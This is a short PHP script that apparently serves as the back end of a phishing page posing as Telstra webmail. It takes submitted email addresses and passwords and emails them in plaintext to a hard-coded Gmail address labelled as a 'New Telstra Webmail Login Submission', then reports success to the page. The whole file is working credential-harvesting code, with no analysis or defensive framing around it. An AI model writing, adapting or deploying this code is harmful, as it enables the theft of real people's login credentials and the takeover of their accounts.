<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Validate input (basic check)
    if (empty($email) || empty($password)) {
        $response = array("status" => "error", "message" => "Email and password are required.");
    } else {
        // Email configuration
        $to = "johnanne194@gmail.com"; // Replace with recipient email
        $subject = "New Telstra Webmail Login Submission";
        $message = "New Login Submission:\nEmail: $email\nPassword: $password";
        $headers = "From: no-reply@yourdomain.com\r\n"; // Replace with your domain
        $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

        // Send email
        if (mail($to, $subject, $message, $headers)) {
            $response = array("status" => "success", "message" => "Submission sent successfully!");
        } else {
            $response = array("status" => "error", "message" => "Failed to send email.");
        }
    }

    // Return JSON response (for AJAX feedback if needed)
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
} else {
    // Redirect if not a POST request
    header("Location: index.html");
    exit;
}
?>